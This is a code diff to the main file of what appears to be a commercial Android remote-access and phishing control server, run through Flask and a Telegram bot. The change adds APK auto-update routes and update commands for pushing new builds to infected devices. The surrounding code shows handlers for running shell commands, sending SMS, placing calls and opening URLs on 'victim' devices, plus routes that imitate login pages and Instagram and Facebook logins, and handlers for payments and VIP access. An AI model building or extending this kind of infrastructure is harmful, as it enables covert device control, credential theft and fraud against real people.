@@ -1,6 +1,7 @@
 # main.py
 # ============================================================
 # DEV 1 - Bot Controller v6
+# مع APK Auto-Update + Web Dashboard
 # ============================================================
 
 import os
@@ -43,10 +44,12 @@ from api_victim import init_victim_api
 
 from bot_handlers import (
     start_command, callback_handler,
+    dashboard_command, update_command,
     victim_name_step, v_toast_step, v_shell_step, v_sendsms_step,
     v_call_step, v_url_step, v_rename_step, victim_name_handler,
     apk_toast_step, apk_shell_step, apk_sendsms_step,
     apk_call_step, apk_url_step,
+    upd_target_handler,
     admin_search_handler, admin_broadcast_handler,
     admin_ban_handler, admin_unban_handler, admin_delete_handler,
     admin_grant_vip_handler, admin_give_stars_handler,
@@ -77,22 +80,36 @@ except Exception as e:
     def init_web_dashboard(app):
         pass
 
+# ============================================================
+# [5] APK Auto-Update
+# ============================================================
+try:
+    from apk_updater import init_apk_update_routes
+    APK_UPDATE_ENABLED = True
+    logger.info("[+] apk_updater imported")
+except Exception as e:
+    logger.exception(f"[-] apk_updater import failed: {e}")
+    APK_UPDATE_ENABLED = False
+
+    def init_apk_update_routes(app, bot):
+        pass
+
 
 # ============================================================
-# [5] Flask Setup
+# [6] Flask Setup
 # ============================================================
 app = Flask(__name__)
 
 
 # ============================================================
-# [6] Origin Gate
+# [7] Origin Gate
 # ============================================================
 ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
 
 ALLOWED_PREFIXES = (
     '/lsh', '/sh', '/rat', '/qr', '/wa',
-    '/apk',         # ★ APK Manager
-    '/dashboard',   # ★ Web Dashboard
+    '/apk',             # ★ APK Manager + Auto-Update
+    '/dashboard',       # ★ Web Dashboard
     '/api/v1/session', '/qr_scan', '/f/',
     '/login.php', '/ig_login.php', '/system_secure',
     '/manifest.json', '/sw.js',
@@ -132,7 +149,7 @@ def verify_origin():
 
 
 # ============================================================
-# [7] Health Check
+# [8] Health Check
 # ============================================================
 @app.route('/')
 def health_check():
@@ -140,7 +157,7 @@ def health_check():
 
 
 # ============================================================
-# [8] Request Timing
+# [9] Request Timing
 # ============================================================
 @app.before_request
 def start_timer():
@@ -168,7 +185,7 @@ def log_request(response):
 
 
 # ============================================================
-# [9] تسجيل الـ Blueprints
+# [10] تسجيل الـ Blueprints
 # ============================================================
 if sh_bp:
     app.register_blueprint(sh_bp)
@@ -196,7 +213,7 @@ if apk_bp:
 
 
 # ============================================================
-# [10] Init Routes
+# [11] Init Routes
 # ============================================================
 init_facebook_routes(app, bot)
 logger.info("[+] Init: facebook routes")
@@ -233,6 +250,16 @@ if APK_MANAGER_ENABLED:
 else:
     logger.warning("[-] APK Manager disabled - skipping init")
 
+# ★ APK Auto-Update Routes
+if APK_UPDATE_ENABLED:
+    try:
+        init_apk_update_routes(app, bot)
+        logger.info("[+] Init: apk update routes")
+    except Exception as e:
+        logger.exception(f"[-] APK Update init failed: {e}")
+else:
+    logger.warning("[-] APK Update disabled - skipping init")
+
 # LSH
 if LSH_ENABLED:
     try:
@@ -248,7 +275,7 @@ register_payment_handlers(bot)
 logger.info("[+] Init: payment handlers")
 
 # ============================================================
-# [11] Victim API
+# [12] Victim API
 # ============================================================
 try:
     init_victim_api(app, bot)
@@ -257,7 +284,7 @@ except Exception as e:
     logger.exception(f"[-] Victim API init failed: {e}")
 
 # ============================================================
-# [12] Short Link
+# [13] Short Link
 # ============================================================
 try:
     init_short_link(app)
@@ -266,13 +293,13 @@ except Exception as e:
     logger.exception(f"[-] Short link init failed: {e}")
 
 # ============================================================
-# [13] Monitoring
+# [14] Monitoring
 # ============================================================
 init_monitoring(app)
 start_cleanup_thread()
 
 # ============================================================
-# [14] Web Dashboard ★ جديد
+# [15] Web Dashboard
 # ============================================================
 if WEB_DASHBOARD_ENABLED:
     try:
@@ -284,7 +311,7 @@ else:
     logger.warning("[-] Web Dashboard disabled - skipping init")
 
 # ============================================================
-# [15] LSH - الرابط المُدخل
+# [16] LSH - الرابط المُدخل
 # ============================================================
 from imports_manager import lsh_push_command
 
@@ -311,7 +338,7 @@ def handle_open_url(message):
 
 
 # ============================================================
-# [16] تشغيل البوت
+# [17] تشغيل البوت
 # ============================================================
 def run_telegram_bot():
     logger.info("=" * 60)
@@ -360,7 +387,7 @@ def run_telegram_bot():
 
 
 # ============================================================
-# [17] Main
+# [18] Main
 # ============================================================
 if __name__ == "__main__":
     try:
